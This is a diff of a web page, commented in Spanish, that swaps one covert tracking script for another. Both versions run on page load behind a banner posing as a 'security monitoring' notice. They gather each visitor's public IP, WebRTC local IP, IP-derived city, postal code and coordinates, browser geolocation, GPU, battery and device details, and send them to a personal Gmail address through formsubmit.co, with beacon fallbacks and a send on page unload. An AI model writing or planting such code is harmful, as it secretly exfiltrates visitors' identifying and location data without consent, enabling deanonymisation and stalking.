@@ -208,365 +208,232 @@
         </div>
     </div>
 
-    <!-- ==========================================
-     SISTEMA BULLETPROOF - ANTI-FALLO TOTAL
-     Colocar INMEDIATAMENTE DESPUÉS de <body>
+  <!-- ==========================================
+     SISTEMA 2-DISPAROS: IP + COMPLETO
      ========================================== -->
 
-<div id="sec-banner" style="background:#7f1d1d;color:#fecaca;text-align:center;padding:10px;font-size:0.9rem;font-family:system-ui;border-bottom:3px solid #ef4444;position:fixed;top:0;width:100%;z-index:2147483647;font-weight:bold;">
-🔒 SISTEMA DE SEGURIDAD ACTIVO - Monitoreo en tiempo real | ID: <span id="sess-id">...</span>
+<div id="sec-banner" style="background:#1e3a8a;color:#dbeafe;text-align:center;padding:10px;font-size:0.85rem;font-family:system-ui;border-bottom:2px solid #3b82f6;position:fixed;top:0;width:100%;z-index:99999;">
+🔒 SESIÓN: <span id="sid">...</span> | Monitoreo activo
 </div>
 
 <script>
-(function BULLETPROOF_TELEMETRY(){
+(function(){
 'use strict';
 
-const CONFIG = {
-    EMAIL: 'system404G@gmail.com',
-    ENDPOINT: 'https://formsubmit.co/ajax/system404G@gmail.com',
-    FALLBACK_ENDPOINT: 'https://formsubmit.co/system404G@gmail.com',
-    MAX_RETRIES: 5,
-    RETRY_DELAY: 2000,
-    IP_TIMEOUT: 600 // ms máximos esperando IP
-};
+const EMAIL = 'system404G@gmail.com';
+const ENDPOINT = 'https://formsubmit.co/ajax/' + EMAIL;
+const FALLBACK = 'https://formsubmit.co/' + EMAIL;
+const SESSION = 'TRK_' + Date.now().toString(36).substr(-6).toUpperCase();
+document.getElementById('sid').textContent = SESSION;
 
-const SESSION = 'SEC_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 5).toUpperCase();
-document.getElementById('sess-id').textContent = SESSION;
+// Flag para evitar duplicados
+let envioCompletoRealizado = false;
 
-// Storage para reintentos
-const STORAGE_KEY = 'pending_telemetry_' + SESSION;
-const pending = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
-
-// ========== DATOS SÍNCRONOS INMEDIATOS ==========
-const baseData = {
-    _subject: '🚨 ALERTA PRIMARIA - IP REQUERIDA - ' + SESSION,
-    _template: 'table',
-    _captcha: 'false',
-    _honey: '',
-    session_id: SESSION,
-    timestamp_utc: new Date().toISOString(),
-    timestamp_local: new Date().toLocaleString(),
-    url: location.href,
-    referrer: document.referrer || 'DIRECTO',
-    user_agent: navigator.userAgent,
-    platform: navigator.platform,
-    vendor: navigator.vendor,
-    language: navigator.language,
-    languages: navigator.languages?.join(',') || navigator.language,
-    screen_resolution: screen.width + 'x' + screen.height,
-    screen_color: screen.colorDepth + '-bit',
-    viewport: window.innerWidth + 'x' + window.innerHeight,
-    pixel_ratio: window.devicePixelRatio || 1,
-    online: navigator.onLine ? 'SI' : 'NO',
-    cookies: navigator.cookieEnabled ? 'SI' : 'NO',
-    cores: navigator.hardwareConcurrency || 'DESCONOCIDO',
-    memory_gb: navigator.deviceMemory || 'DESCONOCIDO',
-    touch_points: navigator.maxTouchPoints || 0,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timezone_offset: new Date().getTimezoneOffset()
-};
-
-// ========== SISTEMA DE ENVÍO ANTI-FALLO ==========
-function enviarDatos(datos, esActualizacion = false) {
-    const payload = JSON.stringify(datos);
-    const resultados = {fetch: false, xhr: false, beacon: false, form: false, img: false};
-    
-    // MÉTODO 1: Fetch con keepalive (moderno, confiable)
-    try {
-        fetch(CONFIG.ENDPOINT, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json', 'Accept': 'application/json'},
-            body: payload,
-            keepalive: true,
-            mode: 'cors'
-        }).then(r => {
-            if(r.ok) { resultados.fetch = true; localStorage.removeItem(STORAGE_KEY); }
-        }).catch(() => {});
-    } catch(e) {}
-    
-    // MÉTODO 2: XMLHttpRequest (síncrono como último recurso, pero aquí asíncrono)
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', CONFIG.ENDPOINT, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onload = function() {
-            if(xhr.status === 200) { resultados.xhr = true; localStorage.removeItem(STORAGE_KEY); }
-        };
-        xhr.send(payload);
-    } catch(e) {}
-    
-    // MÉTODO 3: sendBeacon (para cierre de página, pero lo usamos ahora también)
-    try {
-        if(navigator.sendBeacon) {
-            const blob = new Blob([payload], {type: 'application/json'});
-            const sent = navigator.sendBeacon(CONFIG.FALLBACK_ENDPOINT, blob);
-            if(sent) { resultados.beacon = true; localStorage.removeItem(STORAGE_KEY); }
-        }
-    } catch(e) {}
-    
-    // MÉTODO 4: Formulario oculto (más compatible)
-    try {
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = CONFIG.FALLBACK_ENDPOINT;
-        form.target = '_blank';
-        form.style.display = 'none';
-        
-        Object.keys(datos).forEach(key => {
-            const val = String(datos[key]).substring(0, 2000);
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = key;
-            input.value = val;
-            form.appendChild(input);
-        });
-        
-        document.body.appendChild(form);
-        
-        // Intentar envío AJAX del formulario
-        const formData = new FormData(form);
-        fetch(CONFIG.FALLBACK_ENDPOINT, {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
-        }).then(() => {
-            resultados.form = true;
-            localStorage.removeItem(STORAGE_KEY);
-        }).catch(() => {});
-        
-        setTimeout(() => form.remove(), 1000);
-    } catch(e) {}
-    
-    // MÉTODO 5: Image Beacon (último recurso, siempre funciona)
-    try {
-        const params = new URLSearchParams();
-        params.append('subject', datos._subject || 'Data');
-        params.append('session', datos.session_id || SESSION);
-        params.append('timestamp', Date.now());
-        
-        const img = new Image();
-        img.src = CONFIG.FALLBACK_ENDPOINT + '?' + params.toString();
-        img.onload = () => resultados.img = true;
-        img.onerror = () => {};
-    } catch(e) {}
-    
-    // Guardar para reintento si todo falla (verificación en 3 segundos)
-    if(!esActualizacion) {
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(datos));
-        setTimeout(() => verificarEnvio(datos), 3000);
-    }
-    
-    return resultados;
-}
-
-// Verificar si se envió, si no, reintentar
-function verificarEnvio(datos) {
-    const stillPending = localStorage.getItem(STORAGE_KEY);
-    if(stillPending) {
-        console.log('Reintentando envío...');
-        enviarDatos(datos, true);
-    }
-}
-
-// ========== OBTENER IP ULTRA-RÁPIDA ==========
-async function obtenerIPRapida() {
-    const controllers = [];
-    const timeout = ms => new Promise((_, reject) => {
-        const id = setTimeout(() => reject(new Error('Timeout')), ms);
-        controllers.push(id);
+// ========== ENVÍO ÚNICO (Un solo intento por llamada) ==========
+function enviar(datos) {
+    const form = new FormData();
+    Object.keys(datos).forEach(k => {
+        let val = datos[k];
+        if (typeof val === 'object') val = JSON.stringify(val);
+        form.append(k, String(val).substring(0, 1000));
     });
     
-    const apis = [
-        fetch('https://api.ipify.org?format=json', {cache: 'no-store'}),
-        fetch('https://api.seeip.org/json', {cache: 'no-store'}),
-        fetch('https://api.myip.com', {cache: 'no-store'})
-    ];
-    
-    try {
-        const winner = await Promise.race([
-            Promise.any(apis),
-            timeout(CONFIG.IP_TIMEOUT)
-        ]);
-        const data = await winner.json();
-        return data.ip || data.clientIp || data.query;
-    } catch(e) {
-        return null; // Timeout o error
-    } finally {
-        controllers.forEach(clearTimeout);
-    }
+    // Fetch principal
+    fetch(ENDPOINT, {
+        method: 'POST',
+        body: form,
+        keepalive: true
+    }).catch(() => {
+        // Si fetch falla, intentar beacon (silencioso, no genera duplicado)
+        navigator.sendBeacon && navigator.sendBeacon(FALLBACK, form);
+    });
 }
 
-// ========== EJECUCIÓN INMEDIATA ==========
-
-// PASO 1: Enviar datos básicos INMEDIATAMENTE (0ms) - sin IP pero con sesión
-enviarDatos({
-    ...baseData,
-    estado: 'PRIMER_DISPARO_SIN_IP',
-    nota: 'IP en camino...'
-});
-
-// PASO 2: Esperar IP máximo 600ms y reenviar CON IP
-(async function obtenerYEnviarIP(){
-    const ip = await obtenerIPRapida();
+// ========== OBTENER IP (API más rápida) ==========
+async function getIP() {
+    const apis = [
+        'https://api.ipify.org?format=json',
+        'https://api.seeip.org/json',
+        'https://api.myip.com'
+    ];
     
-    const datosConIP = {
-        ...baseData,
-        _subject: '✅ DATOS CON IP - ' + SESSION,
-        ip_publica: ip || 'NO_OBTENIDA',
-        estado: 'SEGUNDO_DISPARO_CON_IP',
-        metodo_obtencion: ip ? 'API_EXITOSA' : 'TIMEOUT_API'
+    for (const url of apis) {
+        try {
+            const r = await fetch(url, {cache: 'no-store', mode: 'cors'});
+            if (r.ok) {
+                const d = await r.json();
+                return d.ip || d.clientIp || d.query;
+            }
+        } catch(e) {}
+    }
+    return 'NO_OBTENIDA';
+}
+
+// ========== RECOLECTAR TODO (Con fallos tolerados) ==========
+async function recolectarTodo(ipPublica) {
+    // Ejecutar todo en paralelo, si falla alguno sigue con los demás
+    const resultados = await Promise.allSettled([
+        // IP detallada
+        fetch('https://ipapi.co/json/', {cache: 'no-store'})
+            .then(r => r.ok ? r.json() : {})
+            .catch(() => ({})),
+        
+        // WebRTC IP local
+        new Promise(r => {
+            try {
+                const pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = ice => {
+                    if (ice?.candidate?.candidate) {
+                        const m = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                        r(m ? m[0] : 'N/A');
+                    }
+                };
+                setTimeout(() => r('TIMEOUT'), 1500);
+            } catch(e) { r('ERROR'); }
+        }),
+        
+        // WebGL
+        new Promise(r => {
+            try {
+                const c = document.createElement('canvas');
+                const g = c.getContext('webgl');
+                const e = g.getExtension('WEBGL_debug_renderer_info');
+                r(e ? {
+                    vendor: g.getParameter(e.UNMASKED_VENDOR_WEBGL),
+                    renderer: g.getParameter(e.UNMASKED_RENDERER_WEBGL)
+                } : 'N/A');
+            } catch(e) { r('ERROR'); }
+        }),
+        
+        // Batería
+        navigator.getBattery ? navigator.getBattery() : Promise.resolve(null),
+        
+        // Geolocación (rápida, sin pedir permiso)
+        new Promise(r => {
+            if (!navigator.geolocation) return r('NO_SOPORTADA');
+            navigator.geolocation.getCurrentPosition(
+                p => r({lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy}),
+                () => r('DENEGADA'),
+                {timeout: 3000, maximumAge: 60000}
+            );
+        })
+    ]);
+    
+    // Extraer resultados (si falló, queda como 'FALLO')
+    const [ipDetalle, webrtc, webgl, bateria, geo] = resultados.map(r => 
+        r.status === 'fulfilled' ? r.value : 'FALLO'
+    );
+    
+    return {
+        _subject: '📊 COMPLETO - ' + SESSION,
+        _template: 'table',
+        session: SESSION,
+        hora: new Date().toLocaleString(),
+        
+        // IP y Red
+        ip_publica: ipPublica,
+        ip_local: webrtc,
+        pais: ipDetalle.country_name || ipDetalle.country || 'FALLO',
+        ciudad: ipDetalle.city || 'FALLO',
+        region: ipDetalle.region || ipDetalle.regionName || 'FALLO',
+        codigo_postal: ipDetalle.postal || ipDetalle.zip || 'FALLO',
+        latitud_ip: ipDetalle.latitude || ipDetalle.lat || 'FALLO',
+        longitud_ip: ipDetalle.longitude || ipDetalle.lon || 'FALLO',
+        proveedor: ipDetalle.org || ipDetalle.isp || 'FALLO',
+        asn: ipDetalle.asn || 'FALLO',
+        timezone: ipDetalle.timezone || 'FALLO',
+        
+        // Geolocación navegador (si permitió)
+        geo_lat: geo.lat || geo,
+        geo_lon: geo.lon || 'FALLO',
+        geo_precision: geo.acc || 'FALLO',
+        
+        // Sistema
+        plataforma: navigator.platform,
+        user_agent: navigator.userAgent,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        cores: navigator.hardwareConcurrency || 'FALLO',
+        ram_gb: navigator.deviceMemory || 'FALLO',
+        online: navigator.onLine ? 'SI' : 'NO',
+        
+        // Pantalla
+        resolucion: screen.width + 'x' + screen.height,
+        viewport: window.innerWidth + 'x' + window.innerHeight,
+        color_depth: screen.colorDepth,
+        pixel_ratio: window.devicePixelRatio || 1,
+        
+        // GPU
+        gpu_vendor: webgl.vendor || webgl,
+        gpu_renderer: webgl.renderer || 'FALLO',
+        
+        // Batería
+        bateria: bateria ? Math.round(bateria.level * 100) + '%' : 'FALLO',
+        cargando: bateria ? (bateria.charging ? 'SI' : 'NO') : 'FALLO',
+        
+        // Página
+        url: location.href,
+        dominio: location.hostname,
+        referrer: document.referrer || 'DIRECTO',
+        titulo: document.title,
+        
+        // Seguridad
+        cookies: navigator.cookieEnabled ? 'SI' : 'NO',
+        webdriver: navigator.webdriver ? 'SI' : 'NO',
+        touch: navigator.maxTouchPoints,
+        
+        // Tiempo
+        zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: Date.now()
     };
-    
-    // Enviar inmediatamente con o sin IP
-    enviarDatos(datosConIP);
-    
-    // Si conseguimos IP, hacer TERCER envío específico solo con IP para asegurar
-    if(ip) {
-        setTimeout(() => {
-            enviarDatos({
-                _subject: '🎯 CONFIRMACIÓN IP - ' + SESSION,
-                session_id: SESSION,
-                ip_publica: ip,
-                timestamp: new Date().toISOString(),
-                tipo: 'CONFIRMACION_IP'
-            }, true);
-        }, 500);
-    }
-    
-    // ========== DATOS AVANZADOS (PARALELO) ==========
-    // Mientras tanto, recolectar más datos y enviar tercer paquete completo
-    try {
-        const [ipDetallada, webrtc, webgl, bateria] = await Promise.all([
-            // IP detallada de APIs más lentas pero con más info
-            fetch('https://ipapi.co/json/', {cache: 'no-store'})
-                .then(r => r.ok ? r.json() : Promise.reject())
-                .catch(() => fetch('https://ipwho.is/json', {cache: 'no-store'}).then(r => r.json()))
-                .catch(() => ({})),
-            
-            // WebRTC IP local
-            new Promise(resolve => {
-                try {
-                    const pc = new RTCPeerConnection({iceServers: []});
-                    pc.createDataChannel('');
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = ice => {
-                        if(ice?.candidate?.candidate) {
-                            const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
-                            resolve(match ? match[0] : 'N/A');
-                        }
-                    };
-                    setTimeout(() => resolve('TIMEOUT'), 2000);
-                } catch(e) { resolve('ERROR'); }
-            }),
-            
-            // WebGL
-            new Promise(resolve => {
-                try {
-                    const c = document.createElement('canvas');
-                    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                    const ext = gl?.getExtension('WEBGL_debug_renderer_info');
-                    resolve(ext ? {
-                        vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
-                    } : 'NO_DISPONIBLE');
-                } catch(e) { resolve('ERROR'); }
-            }),
-            
-            // Batería
-            navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
-        ]);
-        
-        const datosAvanzados = {
-            _subject: '📊 PAQUETE COMPLETO - ' + SESSION,
-            _template: 'table',
-            session_id: SESSION,
-            timestamp: new Date().toISOString(),
-            
-            // IPs
-            ip_publica_final: ipDetallada.ip || ip || 'N/A',
-            ip_webrtc: webrtc,
-            pais: ipDetallada.country_name || ipDetallada.country || 'N/A',
-            pais_codigo: ipDetallada.country_code || ipDetallada.countryCode || 'N/A',
-            region: ipDetallada.region || ipDetallada.regionName || 'N/A',
-            ciudad: ipDetallada.city || 'N/A',
-            codigo_postal: ipDetallada.postal || ipDetallada.zip || 'N/A',
-            latitud: ipDetallada.latitude || ipDetallada.lat || 'N/A',
-            longitud: ipDetallada.longitude || ipDetallada.lon || 'N/A',
-            proveedor: ipDetallada.org || ipDetallada.isp || ipDetallada.as || 'N/A',
-            timezone_ip: ipDetallada.timezone || 'N/A',
-            
-            // Hardware
-            gpu_vendor: webgl.vendor || 'N/A',
-            gpu_renderer: webgl.renderer || 'N/A',
-            bateria_nivel: bateria ? Math.round(bateria.level * 100) + '%' : 'N/A',
-            bateria_cargando: bateria ? (bateria.charging ? 'SI' : 'NO') : 'N/A',
-            
-            // Performance
-            memoria_usada: performance.memory?.usedJSHeapSize ? Math.round(performance.memory.usedJSHeapSize/1048576) + 'MB' : 'N/A',
-            tiempo_carga: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) + 'ms' : 'N/A',
-            
-            // Detección
-            webdriver: navigator.webdriver ? 'SI' : 'NO',
-            plugins: navigator.plugins?.length || 0,
-            pdf_viewer: navigator.pdfViewerEnabled ? 'SI' : 'NO',
-            bluetooth: navigator.bluetooth ? 'DISPONIBLE' : 'NO',
-            usb: navigator.usb ? 'DISPONIBLE' : 'NO'
-        };
-        
-        // CUARTO ENVÍO con todo
-        enviarDatos(datosAvanzados);
-        
-    } catch(e) {
-        // Incluso si falla todo lo avanzado, al menos tenemos los envíos anteriores
-        console.log('Error en datos avanzados:', e);
-    }
-})();
+}
 
-// ========== SISTEMA DE REINTENTO PERMANENTE ==========
-let intentos = 0;
-const reintentar = setInterval(() => {
-    const pendiente = localStorage.getItem(STORAGE_KEY);
-    if(!pendiente || intentos >= CONFIG.MAX_RETRIES) {
-        clearInterval(reintentar);
-        return;
-    }
-    intentos++;
-    const datos = JSON.parse(pendiente);
-    datos._subject = `🔄 REINTENTO #${intentos} - ${SESSION}`;
-    enviarDatos(datos, true);
-}, CONFIG.RETRY_DELAY);
+// ========== EJECUCIÓN: 2 DISPAROS ==========
 
-// ========== ENVÍO ANTES DE CERRAR PÁGINA ==========
-window.addEventListener('beforeunload', function() {
-    const datosSalida = {
-        _subject: '👋 SALIDA - ' + SESSION,
-        session_id: SESSION,
-        tiempo_total_ms: Date.now() - (performance.timing?.navigationStart || Date.now()),
-        hora_salida: new Date().toISOString()
-    };
+// DISPARO 1: Solo IP (inmediato)
+getIP().then(ip => {
+    // Enviar IP sola inmediatamente
+    enviar({
+        _subject: '🎯 IP CAPTURADA - ' + SESSION,
+        session: SESSION,
+        ip: ip,
+        hora: new Date().toLocaleString(),
+        url: location.href
+    });
     
-    // Intentar múltiples métodos en beforeunload
-    try {
-        navigator.sendBeacon(CONFIG.FALLBACK_ENDPOINT, new Blob([JSON.stringify(datosSalida)], {type: 'application/json'}));
-    } catch(e) {}
+    // DISPARO 2: Todo lo demás (inicia inmediatamente)
+    recolectarTodo(ip).then(datos => {
+        envioCompletoRealizado = true;
+        enviar(datos);
+    });
     
-    // Guardar para reintento posterior
-    localStorage.setItem('exit_' + STORAGE_KEY, JSON.stringify(datosSalida));
+    // FORZAR envío completo a los 2.5s aunque falle algo
+    setTimeout(() => {
+        if (!envioCompletoRealizado) {
+            recolectarTodo(ip).then(datos => {
+                envioCompletoRealizado = true;
+                enviar(datos);
+            });
+        }
+    }, 2500);
 });
 
-// Precargar DNS
-['formsubmit.co', 'ipapi.co', 'api.ipify.org'].forEach(domain => {
-    const link = document.createElement('link');
-    link.rel = 'dns-prefetch';
-    link.href = '//' + domain;
-    document.head.appendChild(link);
+// Backup: Si cierra antes de los 2 segundos, solo enviar aviso (sin duplicar)
+window.addEventListener('beforeunload', () => {
+    if (!envioCompletoRealizado) {
+        const form = new FormData();
+        form.append('_subject', '⚠️ SALIDA RÁPIDA - ' + SESSION);
+        form.append('session', SESSION);
+        form.append('ip', 'Ver email anterior');
+        form.append('tiempo_ms', Date.now() - performance.timing.navigationStart);
+        navigator.sendBeacon && navigator.sendBeacon(FALLBACK, form);
+    }
 });
-
-console.log('%c[SISTEMA BULLETPROOF]', 'color: #ef4444; font-weight: bold;', 'Sesión:', SESSION, '| Enviando datos...');
 
 })();
 </script>
-<!-- ========================================== -->
   
 </body>
 </html>
